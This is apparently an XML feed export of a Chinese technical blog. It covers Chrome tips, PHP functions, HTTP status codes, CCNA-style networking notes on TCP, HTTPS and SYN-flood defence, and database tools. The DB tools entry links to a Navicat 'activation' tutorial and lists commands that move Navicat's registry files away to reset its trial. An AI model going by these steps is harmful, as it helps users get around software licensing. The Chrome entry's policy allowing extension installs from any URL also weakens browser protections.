用数据说话2010年～2017年主流浏览器用户量变化曲线图：2012年浏览器市场份额占比图：2017年百度给出的浏览器市场份额占比图：4.2 有趣的两张图5 Google Chrome 浏览器5.1 获取 Chrome 浏览器下载离线安装包版本链接地址最新稳定版：https://www.google.com/intl/zh-CN/chrome/browser/?standalone=1最新测试版：https://www.google.com/intl/zh-CN/chrome/browser/?standalone=1&amp;extra=betachannel最新开发版：https://www.google.com/intl/zh-CN/chrome/browser/?standalone=1&amp;extra=devchannel下载历史版本：http://dl.google.com/chrome/install/[版本号后两位]/chrome_installer.exe，比如：4.0.266.0》266.0 5.2 常用快捷键操作快捷键打开新窗口Ctrl + n打开新标签页Ctrl + t跳转到下一个打开的标签页Ctrl + Tab 或 Ctrl + PgDn跳转到上一个打开的标签页Ctrl + Shift + Tab 或 Ctrl + PgUp打开当前标签页浏览记录中记录的上一个页面Alt + 向左箭头键打开当前标签页浏览记录中记录的下一个页面Alt + 向右箭头键关闭当前标签页Ctrl + w 或 Ctrl + F4跳转到地址栏Ctrl + l开启或关闭全屏模式F11在新的后台标签页中打开链接按住 Ctrl 键的同时点击链接小提示：以上是Chrome浏览器的常用快捷键。因为每个人使用的浏览器不一样，具体参考对应的浏览器官方文档。5.3 扩展推荐5.3.1 广告终结者推荐指数：★★★★★推荐理由：去除网页上烦人的广告，还用户一个清新的上网界面。如：Firefox（火狐）浏览器有Adblock Plus5.3.2 Nimbus Screenshot推荐指数：★★★★  推荐理由：优秀的网页截图工具。5.3.3 Nimbus Note推荐指数：★★★☆推荐理由：快速记录网页浏览笔记。5.3.4 划词翻译推荐指数：★★★☆推荐理由：中英文翻译利器，可选择翻译引擎。5.3.5 Vimium推荐指数：★★★★☆推荐理由：效率利器，可以让您告别您的鼠标。推荐指数只有4星半，是因为该插件一般只有开发人员或运维人员会使用，当然也不排除其他感兴趣者。5.3.6 Wappalyzer推荐指数：★★★☆推荐理由：网站技术分析，对于 Web 开发人员还是很适用的。5.3.7 SwitchyOmega推荐指数：★★★★★推荐理由：适用于中国大陆用户，配合代理服务器使用。原因大家都知道，这里不做解释。5.3.8 Charset推荐指数：★★★★★推荐理由：自chrome版本55.0开始，不再支持设置网页内容编码，此时可以使用该插件设置。5.3.9 EverSync推荐指数：★★★★☆推荐理由：用于书签同步。如果您有更完美的插件，请在评论中写出，期待您的分享。5.3.10 搜索小技巧双引号：完全匹配“云南天成科技”，返回完全匹配的结果。减号：筛选"mysql foreign key" - "nodejs"：要求Google返回含有mysql foreign key但不存在nodejs的文章。  星号：通配符"云南天成科技 *"，返回所有已知的关于云南天成科技的结果。站内搜索site:www.tzyun.com "天智云"，返回对应站点内所有包含天智云的结果5.4 问题解决5.4.1 windows 下安装 chrome 错误，错误代码：0xa0430721解决：完全卸载chrome。1）清理注册表，可以通过新建注册文件来清理注册表内容，参考资料： http://blog.csdn.net/libaineu2004/article/details/45533299 2）删除chrome目录 3）重启计算机 4）再次运行安装，问题得到解决 5.4.2 解决安装Chrome 66版本以后，不能拖拽安装扩展问题1.Windows： 2.Mac OS X： 3.Linux： $ touch custom_policies.json { "ExtensionInstallSources": [     "*://*/*"   ] } $ sudo mkdir ­p /etc/opt/chrome/policies/recommended $ sudo mv custom_policies.json /etc/opt/chrome/policies/recommended/ 最后打开 Chrome 的 chrome://policy 页面,点击左上方的按钮重新加载策略信息便可令 设置即时生效。 参考：https://www.tuicool.com/articles/fUJB7v ]]></content>
      <categories>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> Browser </tag>
        
          <tag> 浏览器 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 常见内置函数]]></title>
      <url>/php/2018/05/04/php-functions/</url>
      <content type="text"><![CDATA[String  strlen()，获取字符串长度。  substr()，字符串截取。substr(字符串变量,开始截取的位置，截取个数） 。如：substr($tempStr,0,strlen($tempStr)-3);//去除字符串后3位 。  mb_substr() ，字符串截取。mb_substr(字符串变量,开始截取的位置，截取个数, 网页编码） 。  strpos()，查找字符串首次出现的位置。strpos(要处理的字符串, 要定位的字符串, 定位的起始位置[可选])  str_replace()，搜索替换字符串。str_replace(要查找的字符串, 要替换的字符串, 被搜索的字符串, 替换进行计数[可选])                              preg_replace()，搜索匹配替换字符串。Eg：搜索匹配到，,\n\r\s的使用          替换：preg_replace(‘/[,，\s\r\n]+/’, ‘          ’, $ids);                      sprintf()，格式化字符串。sprintf(格式,要转化的字符串)，Eg：Sprintf(‘%01.2f’,$str);  Implode()/explode()，字符串的合并（array-&gt;string）与分割（string-&gt;array）。合并:Implode(分隔符[可选], 数组);分割:explode(分隔符[可选], 字符串)  addslashes()，字符串转义。如I’m Zhao中的’。  htmlentities/htmlspecialchars/addslashes/stripslashes/strip_tags、mysql_real_escape_strin。          htmlentities 和 htmlspecialchars 的区别:这两个函数的功能都是转换字符为 HTML 字符编码，特别是 url 和代码字符串。htmlentities 转换所有的 html 标记；htmlspecialchars 只格式化&amp; ‘ “ &lt; 和 &gt; 这几个特殊符号。        json_decode()，对 JSON 格式的字符串进行解码。  json_encode()，对变量进行 JSON 编码 。  strtolower()，把所有字符转换为小写  strncmp() ， 二进制安全比较字符串开头的若干个字符（区分大小写）    Array    PHP Array          curl_setopt_array — 为 cURL 传输会话批量设置选项 array_change_key_case — 将数组中的所有键名修改为全大写或小写 array_chunk — 将一个数组分割成多个 array_column — 返回数组中指定的一列 array_combine — 创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值 array_count_values — 统计数组中所有的值 array_diff_assoc — 带索引检查计算数组的差集 array_diff_key — 使用键名比较计算数组的差集 array_diff_uassoc — 用用户提供的回调函数做索引检查来计算数组的差集 array_diff_ukey — 用回调函数对键名比较计算数组的差集 array_diff — 计算数组的差集 array_fill_keys — 使用指定的键和值填充数组 array_fill — 用给定的值填充数组 array_filter — 用回调函数过滤数组中的单元。相当于如下代码块：      // 去除空元素&lt;?phpforeach($arr as $k=&gt;$v){    if(!$v) unset($arr[$k]);}?&gt;            array_flip — 交换数组中的键和值 array_intersect_assoc — 带索引检查计算数组的交集 array_intersect_key — 使用键名比较计算数组的交集 array_intersect_uassoc — 带索引检查计算数组的交集，用回调函数比较索引 array_intersect_ukey — 用回调函数比较键名来计算数组的交集 array_intersect — 计算数组的交集 array_key_exists — 检查数组里是否有指定的键名或索引 array_key_first — Gets the first key of an array array_key_last — Gets the last key of an array array_keys — 返回数组中部分的或所有的键名 array_map — 为数组的每个元素应用回调函数 array_merge_recursive — 递归地合并一个或多个数组 array_merge — 合并一个或多个数组 array_multisort — 对多个数组或多维数组进行排序 array_pad — 以指定长度将一个值填充进数组 array_pop — 弹出数组最后一个单元（出栈） array_product — 计算数组中所有值的乘积 array_push — 将一个或多个单元压入数组的末尾（入栈） array_rand — 从数组中随机取出一个或多个单元 array_reduce — 用回调函数迭代地将数组简化为单一的值 array_replace_recursive — 使用传递的数组递归替换第一个数组的元素 array_replace — 使用传递的数组替换第一个数组的元素 array_reverse — 返回单元顺序相反的数组 array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名 array_shift — 将数组开头的单元移出数组 array_slice — 从数组中取出一段 array_splice — 去掉数组中的某一部分并用其它值取代 array_sum — 对数组中所有值求和 array_udiff_assoc — 带索引检查计算数组的差集，用回调函数比较数据 array_udiff_uassoc — 带索引检查计算数组的差集，用回调函数比较数据和索引 array_udiff — 用回调函数比较数据来计算数组的差集 array_uintersect_assoc — 带索引检查计算数组的交集，用回调函数比较数据 array_uintersect_uassoc — 带索引检查计算数组的交集，用单独的回调函数比较数据和索引 array_uintersect — 计算数组的交集，用回调函数比较数据 array_unique — 移除数组中重复的值 array_unshift — 在数组开头插入一个或多个单元 array_values — 返回数组中所有的值 array_walk_recursive — 对数组中的每个成员递归地应用用户函数 array_walk — 使用用户自定义函数对数组中的每个元素做回调处理 array — 新建一个数组 arsort — 对数组进行逆向排序并保持索引关系 asort — 对数组进行排序并保持索引关系 compact — 建立一个数组，包括变量名和它们的值 count — 计算数组中的单元数目，或对象中的属性个数 current — 返回数组中的当前单元 each — 返回数组中当前的键／值对并将数组指针向前移动一步 end — 将数组的内部指针指向最后一个单元 extract — 从数组中将变量导入到当前的符号表 in_array — 检查数组中是否存在某个值 key_exists — 别名 array_key_exists key — 从关联数组中取得键名 krsort — 对数组按照键名逆向排序 ksort — 对数组按照键名排序 list — 把数组中的值赋给一组变量 natcasesort — 用“自然排序”算法对数组进行不区分大小写字母的排序 natsort — 用“自然排序”算法对数组排序 next — 将数组中的内部指针向前移动一位 pos — current 的别名 prev — 将数组的内部指针倒回一位 range — 根据范围创建数组，包含指定的元素 reset — 将数组的内部指针指向第一个单元 rsort — 对数组逆向排序 shuffle — 打乱数组 sizeof — count 的别名 sort — 对数组排序 uasort — 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 uksort — 使用用户自定义的比较函数对数组中的键名进行排序 usort — 使用用户自定义的比较函数对数组中的值进行排序      Date/Datetime      Math  bcadd — 2个任意精度数字的加法计算 echo bcadd($a, $b, 4);  // 6.2340 bccomp — 比较两个任意精度的数字 bcdiv — 2个任意精度的数字除法计算 bcmod — 对一个任意精度数字取模 bcmul — 2个任意精度数字乘法计算 echo bcmul(‘1.34747474747’, ’35’, 3); // 47.161 bcpow — 任意精度数字的乘方 bcpowmod — Raise an arbitrary precision number to another, reduced by a specified modulus bcscale — 设置所有bc数学函数的默认小数点保留位数 bcsqrt — 任意精度数字的二次方根 bcsub — 2个任意精度数字的减法 echo bcsub($a, $b, 4);  // -3.7660 ceil()，向上取整。  文件  file_put_contents, 将一个字符串写入文件  &lt;?php// 格式:file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int// FILE_USE_INCLUDE_PATH	在 include 目录里搜索 filename。 更多信息可参见 include_path。// FILE_APPEND	如果文件 filename 已经存在，追加数据而不是覆盖。// LOCK_EX	在写入时获得一个独占锁。file_put_contents('20190606.json', json_encode(), FILE_APPEND, null);    file_get_contents — 将整个文件读入一个字符串```php// 格式:file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] ) : string```  file_exists — 检查文件或目录是否存在  魔术方法  __call() ，在一个对象的上下文中，如果调用的方法不能访问，它将被触发。 __callStatic() ，在一个静态的上下文中，如果调 用的方法不能访问，它将被触发。]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[HTTP Error 代码释义表]]></title>
      <url>/network/2018/01/27/http-error/</url>
      <content type="text"><![CDATA[2xx：成功CodeDescription200正常：请求已完成。201正常：请求成功并且服务器创建了新的资源。202正常：服务器已接受请求，但尚未处理。203正常：服务器已成功处理了请求，但返回的信息可能来自另一来源。204正常：服务器成功处理了请求，但没有返回任何内容。205正常：服务器成功处理了请求，但没有返回任何内容。206正常：服务器成功处理了部分 GET 请求。3xx：重定向CodeDescription301已移动 — 请求的数据具有新的位置且更改是永久的。302已找到 — 请求的数据临时具有不同 URI。303请参阅其它 — 可在另一 URI 下找到对请求的响应，且应使用 GET 方法检索此响应。304未修改 — 未按预期修改文档。305使用代理 — 必须通过位置字段中提供的代理来访问请求的资源。306未使用 — 不再使用；保留此代码以便将来使用。4xx：客户端出现的错误表1：CodeDescriptiono400错误请求 — 请求中有语法问题，或不能满足请求。401请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。402需要付款 — 表示计费系统已有效。403禁止 — 服务器拒绝请求。404未找到 — 服务器找不到请求的网页。405禁用 — 禁用请求中指定的方法。406不接受 — 无法使用请求的内容特性响应请求的网页。407需要代理授权 — 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。408请求超时 — 服务器等候请求时发生超时。409冲突 — 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。410已删除 — 如果请求的资源已永久删除，服务器就会返回此响应。411需要有效长度 — 服务器不接受不含有效内容长度标头字段的请求。412未满足前提条件 — 服务器未满足请求者在请求中设置的其中一个前提条件。413请求实体过大 — 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。414请求的 URI 过长 — 请求的 URI（通常为网址）过长，服务器无法处理。415不支持的媒体类型 — 请求的格式不受请求页面的支持。416请求范围不符合要求 — 如果页面无法提供请求的范围，则服务器会返回此状态代码。417未满足期望值 — &gt;服务器未满足”期望”请求标头字段的要求。表2：CodeDescription401.1未授权：登录失败401.2未授权：服务器配置问题导致登录失败401.3ACL 禁止访问资源401.4未授权：授权被筛选器拒绝401.5未授权：ISAPI 或 CGI 授权失败403.1禁止访问：禁止可执行访问403.2禁止访问：禁止读访问403.3禁止访问：禁止写访问403.4禁止访问：要求 SSL403.5禁止访问：要求 SSL 128403.6禁止访问：IP 地址被拒绝403.7禁止访问：要求客户证书403.8禁止访问：禁止站点访问403.9禁止访问：连接的用户过多403.10禁止访问：配置无效403.11禁止访问：密码更改403.12禁止访问：映射器拒绝访问403.13禁止访问：客户证书已被吊销403.15禁止访问：客户访问许可过多403.16禁止访问：客户证书不可信或者无效403.17禁止访问：客户证书已经到期或者尚未生效404.1无法找到 Web 站点5xx：服务端出现的错误CodeDescription500服务器内部错误 — 服务器遇到错误，无法完成请求。501尚未实施 — 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。502错误网关 — 服务器作为网关或代理，从上游服务器收到无效响应。503服务不可用 — 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。504网关超时 — 服务器作为网关或代理，但是没有及时从上游服务器收到请求。505HTTP 版本不受支持 — 服务器不支持请求中所用的 HTTP 协议版本。]]></content>
      <categories>
        
          <category> network </category>
        
      </categories>
      <tags>
        
          <tag> HTTP-Error </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[CCNA]]></title>
      <url>/network/2018/01/03/ccna-7th/</url>
      <content type="text"><![CDATA[1 前言2 网络互连基础网络分段(network segmentation)问题：为什么要使用网络分段？答：随着网络的增大，用户响应非常缓慢，而LAN数据流将发生严重阻塞。问题：导致LAN阻塞的常见原因？答：统一广播域或冲突域中的主机太多; 广播风暴； 组播数据流太多；带宽太低；使用集线器扩展网络。广播域(broadcast domain)指同一个网段中所有设备组成的集合，这些设备侦听该网段中发送的所有广播。冲突域(collision domain)指一种网络情形，即网段上的一台设备发送分组时，该物理网段上的其他所有设备都必须侦听它。MAC 地址IP 地址集线器路由器第3层交换机，用以组建互联网络。默认对广播域进行分割。与第2层交换机转发或过滤帧不同，路由器使用逻辑地址，并提供分组交换功能。路由器使用访问列表进行分组过滤。路由器每个接口都提供不同的广播域。交换机用途是让LAN更好地运行——优化其性能，向LAN用户提供更高的带宽。默认情况下，对冲突域进行分割。交换机每个端口都是一个独立的冲突域。网桥3 网络互联模型3.1 基本概念ARPAddress Resolution Protocol，地址解析协议。ISOIntelnational Organization for Standardzation，国际标准化组织。OSIOpen Systems Intelconnection，开放系统互联模型。通常有7层模型和5层模型。由于 OSI 参考模型过于庞大、复杂招致了许多批评，由技术人员自己设计了TCP/IP协议栈。TCPTransmission Control Protocol，传输控制协议。面向连接的、可靠的、基于字节流的传输层通信协议；将应用层的数据流分割成报文段并发送给目标节点的TCP层；数据包都有序号，对方收到则发送ACK确认，未收到则重传。处理数据头部：先自上而下，后自下而上UDPUser Datagram Protocol，用户数据报协议。udp 特点面向非连接不维护连接状态，支持同时向多个客户端传输相同的消息数据包报头只有 8个字节，额外开销较小吞吐量只受限于数据生成速率、传输速率以及机器性能尽最大努力交付，不保证可靠交付，不需要维护复杂的连接状态表面向报文，不对应用程序提交的报文信息进行拆分或者合并HTTP超文本传输协议(Hypertext Transfer Protocol)特点支持客户端/服务器模式简单快速灵活无连接无状态Cookie是由服务器发送给客户端的特殊信息，以文本的形式存放在客户端，客户端再次请求时，会把 Cookie 回发，服务器收到后，会解析 Cookie，生成与客户端相对应的内容Cookie 的设置及发送过程Session服务端的机制，在服务器上保存信息。解析客户端请求并操作 session id，按需保存状态信息。Session 的实现方式使用 Cookie 实现使用 URL 回写实现HTTPSHypertext Transfer Protocol Secure，超文本传输安全协议。SSLSecurity Sockets Layer，安全套接层。为网络通信提供安全及数据完整性的一种安全协议，是操作系统对外的 API，SSL 3.0 后更名为 TLS。采用身份认证和数据加密保证网络通信的安全和数据的完整性。加密方式对称加密非对称加密哈希算法数字签名：证明某个消息或文件是某人发出/认同的HTTPS 数据传输流程浏览器将支持的加密算法信息发送给服务器服务器选择一套浏览器支持的加密算法，以证书的形式回发浏览器浏览器验证证书合法性，并结合证书公钥加密信息发送给服务器服务器使用私钥解密信息，验证哈希，加密响应消息回发浏览器浏览器解密响应信息，并对消息进行验证，之后进行加密交互数据SocketSocket 是对 TCP/IP 协议的抽象，是操作系统对外开放的接口。3.2 各层协议对照Table 1: 各层协议对照层次OSI 七层模型OSI 五层模型TCP/IP 四层参考模型功能描述TCP/IP协议族7应用层应用层应用层文件、打印、消息、数据库和应用程序服务。规定发送方和接受方必须使用固定长度的消息头，消息头必须使用某种固定的组成，而且消息头里必须记录消息体的长度等信息，以便接受方能 够正确解析信息。DHCP（v6）、DNS、FTP、Gopher、HTTP（SPDY、HTTP/2）、IMAP4、IRC、NNTP、XMPP、POP3、SIP、SMTP、SNMP、SSH、TELNET、RPC、RTCP、RTP、RTSP、SDP、SOAP、GTP、STUN、NTP、SSDP6表示层&#xa0;&#xa0;信息的语法语义以及他们的关联，如数据加密、压缩和转换服务。用于解决不同操作系统之间的通信语法问题。没有协议5会话层&#xa0;&#xa0;对话控制。不同机器上的用户之间建立及管理会话。要建立一个自动收发包，自动寻址的功能，就是会话层。没有协议4传输层传输层传输层端到端连接。接受上一层的数据，在必要的时候把数据进行分割，并将这些数据交给网络层，且保证这些数据段有效到达对端。随着网络通信需求的进一步扩大，通信过程中需要发送大量的数据，如海量文件传输的，需要进行传输切分发送，切分为多个段落，其中一段落丢失如何处理？要不要重新传输？每个段落需要按照顺序到达吗？这就是传输从层需要解决的问题。传输层解决了主机间的数据传输及传输质量的问题，传输协议同时进行流量控制，或是基于接受方可接受数据的快慢程度，规定适当的发送速率。除此之外，传输层按照网络处理的最大尺寸，将较强的数据包进行强制分割，对每一个数据片分配序列号，便于接受方重组，例如以太网无法接受大于1500字节的数据包。传输层主要关注TCP、UDP协议。TCP（T/TCP · Fast Open）、UDP、DCCP、SCTP、RSVP、PPTP、TLS/SSL3网络层网络层网络层（网络互联层）控制子网的运行，如逻辑编址，分组传输，路由选择。随着网络节点的增加，点对点通信需要经过多个节点，此时就出现了路径最优选择问题，便有了网络层。该层主要功能是将网络地址翻译为对应的物理地址，并决定如何将数据从发送发方路由到接受方。网络层通过综合考虑发送优先权，网络拥塞程度，服务质量，以及可选路由的花费，从而来决定一个网络中节点A到另一个网络中节点B的最佳路径。网络层主要关注TCP/IP协议中的IP协议。IP（v4·v6）、ICMP（v6）、IGMP、IS-IS、IPsec、BGP、RIP、OSPF、RARP2数据链路层数据链路层主机到网络层（链路层）物理寻址，同时将原始byte流转变为逻辑传输线路，成帧。物理从层在传输byte流的过程中，会出现错传、传输不完整的可能，因此有了数据链路层。数据链路层定义了如何格式化数据进行传输，以及如何让控制对物理介质的访问。另外，还提供错误检测和纠正，以确保数据传输的可靠性。该层将byte数据组成帧，交换机工作在这一层，对帧解码，并根据帧中包含的信息把数据发送到正确的接受方。Wi-Fi（IEEE 802.11）、ARP、WiMAX（IEEE 802.16）、ATM、DTM、令牌环、以太网、FDDI、帧中继、GPRS、EV-DO、HSPA、HDLC、PPP、PPPoE、L2TP、ISDN、SPB、STP、SLIP、CSLIP、PPP、RARP、MTU1物理层物理层&#xa0;物理拓扑，机械、电子、定时接口通信信道上的原始比特流传输，IEEE 802.2，Ethernet v.2，……；物理层主要定义了物理设备的标准，网线的类型，光纤的接口类型，各种传输介质的传输速率等，主要传输byte流，即01011……。以太网、 调制解调器、电力线通信、同步光网络、G.709、光导纤维、同轴电缆、双绞线、ISO2110、IEEE802、IEEE802.23.3 TCP/IP协议栈3.3.1 TCP &amp; UDPTCP "三次握手"TCP 报文头TCP FlagsURG：urgent，紧急ACK：acknowledgement，确认PSH：push，传送RST：reset，重置SYN：synchronous，同步序号，用于建立连接过程FIN：finish，结束，用于释放连接Sequence number：顺序序号Acknowledge number：确认序号三次握手示意图及描述第一次握手：建立连接客户端发送连接请求报文段，将 SYN 置为 1，Sequence number 置为 x，然后客户端进入 SYN_SEND 状态，等待服务器确认。第二次握手：服务器收到 SYN 报文段服务器收到 SYN 报文段并进行确认，设置 Acknowledge number 为 x+1（Sequence number+1）；同时，自己也发送一个 SYN 包，将 SYN 置为 1，Sequence number 置为 y，服务器端将上述所有信息放到一个报文段，即 SYN+ACK 包，一并发送给客户端，此时服务器进入 SYN_RECV 状态。第三次握手：客户端收到服务器的 SYN+ACK 包将 Acknowledge number 置为 y+1，向服务器发送 ACK 报文段，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成 TCP 三次握手。常见问题问题1：为什么要进行三次握手？答：为了初始化 Sequence Number 值，通信时需要互相通知对方 Sequence Number，它将作为后期数据通信的序号，保证应用层接收到的数据不会因为网络传输问题而乱序。即 TCP 将会用它拼接数据。问题2：SYN Flood（超时） 攻击？答：原因分析——Server 收到 Client 的 SYN，回复 SYN-ACK 的时候未收到 ACK 确认，接着 Server 不断重试直至超时，Linux 默认等待 63秒才断开连接；解决办法（防护措施）：SYN 队列满后，通过 tcp_syncookies 参数回发 SYN Cookie（当 SYN 队列满后，TCP 会通过原地址端口、目标地址端口和时间戳创建一个特别的 Sequence Number 回发，简称 SYN Cookie），若为正常连接则 Client 会 回发 SYN Cookie，直接建立连接。问题3：建立 TCP 连接后，Client 出现故障怎么办？答：TCP 设有保活机制，在一段时间内，连接处于非活动状态，向对方发送保活探测报文，如果未收到响应则继续发送，尝试次数达到保活探测数仍未收到响应则中断连接。TCP "四次挥手"四次挥手示意图及描述第一次挥手（发起可以是客户端，也可以是服务端）设置 Sequence Number 和 Acknowledgment Number，Client 发送一个 FIN 报文段，用来关闭 Client 到 Server 的数据传送，Client 进入 FIN_WAIT_1 状态。第二次挥手Server 收到 FIN 报文段后，发送一个 ACK 报文段给 Client，Acknowledgment Number 为 Sequence Number+1，Server 进入 CLOSE_WAIT 状态。第三次挥手Sever 发送一个 FIN 报文段，用来关闭 Server 到 Client 的数据传送，Server 进入 LAST_ACK 状态。第四次挥手Client 收到 FIN 报文段后，Client 进入 TIME_WAIT 状态，接着发送一个 ACK 报文段给 Server，Acknowledgment Number 为 Sequence Number+1，Server 进入 CLOSED 状态，此时，Client 等待 2MSL后依然没有收到回复，则证明 Server 端已正常关闭，Client 进入 CLOSED 状态。2MSLMSL(Maximum Segment Lifetime)，也就是报文最大生存时间，引用《TCP/IP详解》中的话：“它(MSL)是任何报文段被丢弃前在网络内的最长时间。”2MSL也就是这个时间的 2 倍。RFC 1122建议 MSL 的值为 2 分钟，不过源自Berkeley的实现传统上改用30秒这个值。也就是说TIME_WAIT状态的持续时间在1-4分钟之间。TTL为了防止数据包在网络中无限循环，而设定的网络数据包在网络传输中的最大的转发次数，因为每转发一次在路由器，就会转向下一跳，通常称为最大跳数。具体含义即就是：我们本地机器发出一个数据包，数据包经一定数量路由器后传送到目的主机，但由于多种原因，一些数据包不能正常传送到目的主机，那如果不给这些数据包一个生存时间的话，这些数据包就会在网络上不断的传送，导致网络开销的增大。当数据包传送到一个路由器之后，TTL就自动减 1，如果减到 0 了还没有传送到目的主机，那么数据就会自动消失，发送数据的一方则请求超时。	  TTL默认值三次握手和四次挥手示意图常见问题问题1：为什么会有 TIME_WAIT 状态？答：确保有足够的时间让对方收到ACK包；避免新旧连接混淆。问题2：为什么要进行"四次挥手"？答：当关闭连接时，服务器端收到了客户端的 FIN 报文通知，这仅仅表示客户端没有数据发送给服务器端了，我们知道 TCP 是全双工通信，所以未必服务器端的全部数据发送给了客户端，所以服务器端未必会马上关闭 socket ，也许服务器端还需要发送一些数据给客户端之后，再发送FIN报文给客户端，表示同意现在关闭连接，所以服务器端的 ACK 报文和 FIN 报文大多数情况下都是分开发送的。问题3：服务器出现大量 CLOSE_WAIT 状态的原因？答：对方关闭 Socket 连接，我方忙于读或写，没有及时关闭连接。解决方式——检查代码，特别是释放资源的代码；检查配置，特别是处理请求的线程配置。如：$ netstat -n | awk '/^tcp/{++S[$NF]}END{for(a in S) print a,S[a]}'TCP 滑动窗口RTT 和 RTORTT：发送一个数据包到收到对应的ACK所花费的时间RTO：重传时间间隔TCP 使用滑动窗口做流量控制与乱序重排，这样保证TCP的可靠性、流控特性。TCP 和 UDP 的区别面向连接 VS 无连接可靠性有序性速度量级，从报头来看，TCP 属于重量级，UDP 属于轻量级。3.3.2 HTTP &amp; HTTPSHTTP 请求结构HTTP 响应结构HTTP 请求/响应步骤客户端连接到 Web 服务器发送 HTTP 请求服务器接受请求并返回 HTTP 响应释放 TCP 连接客户端浏览器解析 HTML 内容常见问题浏览器键入 URL 经历的流程DNS 解析TCP 连接发送 HTTP 请求服务器处理请求并返回 HTTP 响应报文浏览器解析渲染页面连接结束HTTP 状态码详见文章《HTTP Error 代码释义表》常见状态码200：OK，正常返回信息400：Bad Request，客户端请求有语法错误401：Unauthorized，请求未经授权403：Forbidden，服务器收到请求，但是拒绝提供服务404：Not Found，请求资源未找到500：Internal Server Error，服务器发生了未知错误503：Server Unavailable，服务器当前不能处理客户端的请求，一段时间后可能恢复正常GET 和 POST 的区别HTTP 报文层面：GET 将请求信息放在 URL 中，POST 放在报文体中；数据库层面：GET 符合幂等性和安全性，POST 不符合；幂等的意味着对同一URL的多个请求应该返回同样的结果。这里解释一下幂等这个概念：幂等（idempotent、idempotence）是一个数学或计算机学概念，常见于抽象代数中。幂等有一下几种定义：&gt;对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有abs(a)=abs(abs(a))。&gt;对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在在实数集中幂等，即max(x,x) = x。安全的含义仅仅是指是非修改信息。其他层面：GET 可以被缓存、被存储，而 POST 不可以；GET 方式提交的数据最多只能是 1024字节，理论上 POST 没有限制，可传较大量的数据。POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因登录页面有可能被浏览器缓存，其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击。Cookie 和 Session 的区别Cookie 数据存放在客户端，Session 数据存放在服务器上；Session 相对于 Cookie 更安全；若考虑减轻服务器负担，应当使用 Cookie。HTTP 和 HTTPS 的区别HTTPS 需要用到 CA 证书，HTTP 不需要；HTTPS 密文传输，HTTP 明文传输；连接方式不同，HTTPS 默认使用 443 端口，HTTP 使用 80 端口；HTTPS = HTTP+加密+认证+完整性保护，较 HTTP 安全HTTPS 真的很安全吗？如何预防？答：未必。浏览器默认填充 http://，请求需要进行跳转，此时有被劫持的风险；可以使用 HSTS(HTTP Strict Transport Security)优化。3.3.3 SocketSocket 通信流程面试题问题描述：编写一个网络应用程序，有客户端和服务器端，客户端向服务器发送一个字符串，服务器收到该字符串后将其打印到命令行，然后向客户端返回该字符串的长度，最后，客户端输出服务器返回的该字符串的长度，分别用 TCP 和 UDP 两种方式去实现。4 以太网以太网以太网是一种竞用的介质访问方法，可让一个网络中的所有主机共享链接带宽。CSMA/CDCarrier Sense Multiple Access With Collision Detection，载波侦听多路访问/冲突检测。5 ReferencesTransmission Control Protocol WikiUnderstanding TCP and UDP ProtocolsTCP三次握手详解TCP四次挥手详解TCP三次握手和四次挥手以及SSL四次握手HTTP请求报文浅谈HTTP中Get与Post的区别]]></content>
      <categories>
        
          <category> network </category>
        
      </categories>
      <tags>
        
          <tag> CCNA </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[DB Tools]]></title>
      <url>/software/2017/12/14/db-tools/</url>
      <content type="text"><![CDATA[Navicat激活  Windows          Navicat Premium 12.1.16.0激活教程： https://www.jianshu.com/p/5f693b4c9468        Linux          $ ls ~/.navicat64/ dosdevices  drive_c  Navicat  system.reg  userdef.reg  user.reg $ cd ~/.navicat64 $ mv system.reg /tmp/ $ mv user.reg /tmp/        Navicat Premium 连接Oracle，连接不上，原因是版本原因    Power Designer    常用快捷键    | keyboard     | Description           ||:————-|:———————-|| Alt+Enter    | Properties            || Ctrl+I       | Insert an Object      || Ctrl+Shift+I | Insert an Sub-Object  |    需求模型RQM    | “Priority” | （需求优先级）                                             || “Wordload” | （工作量）                                                 || “Risk”     | （风险等级）                                               || “Status”   | （状态，包括草稿、已定义、已校验、待评审和已评审五种状态） |    各类模型介绍    Requirements,需求模型          A requirements model (RQM) helps you analyze any kind of written requirements and link them with users and groups who will implement them and with design objects in other models. You can use an RQM to represent any structured document (e.g. functional specification, test plan, business goals, etc.) and import and export hierarchies of requirements as MS Word documents.                                                                                                        2. Conceptual Data,概念数据模型（CDM）A conceptual data model (CDM) helps you analyze the conceptual structure of an information system, to identify the principal entities to be represented, their attributes, and the relationships between them. A CDM is more abstract than a logical (LDM) or physical (PDM) data model.帮助您分析信息系统的概念结构,确定主要实体的代表,它们的属性和它们之间的关系。清洁发展机制是更抽象的逻辑(LDM)或物理数据模型(PDM)。        Logical Data,逻辑数据模型（LDM）          A logical data model (LDM) helps you analyze the structure of an information system, independent of any specific physical database implementation. An LDM has migrated entity identifiers and is less abstract than a conceptual data model (CDM), 